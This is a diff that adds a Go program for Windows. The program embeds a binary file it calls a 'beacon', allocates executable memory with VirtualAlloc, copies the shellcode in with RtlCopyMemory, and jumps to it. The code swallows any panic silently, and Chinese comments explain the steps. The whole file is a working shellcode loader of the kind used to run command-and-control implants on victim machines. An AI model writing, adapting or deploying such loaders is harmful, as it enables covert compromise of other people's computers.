@@ -1,0 +1,45 @@
+package main
+
+import (
+	_ "embed"
+	"syscall"
+	"unsafe"
+)
+
+//go:embed static/tmp.bin
+var beacon []byte
+
+// shellcode
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+	KEY_1                  = 55
+	KEY_2                  = 66
+)
+
+var (
+	kernel32      = syscall.MustLoadDLL("kernel32.dll")
+	ntdll         = syscall.MustLoadDLL("ntdll.dll")
+	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
+	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
+)
+
+func Run(shellcodeBeacon []byte) {
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcodeBeacon)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) // 为shellcode申请内存空间
+	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcodeBeacon[0])), uintptr(len(shellcodeBeacon))) // 将shellcode内存复制到申请出来的内存空间中
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+func shellcoeRun(code []byte) {
+	Run(code)
+}
+
+func main() {
+	defer func() {
+		if v := recover(); v != nil {
+			return
+		}
+	}()
+	shellcoeRun(beacon)
+}
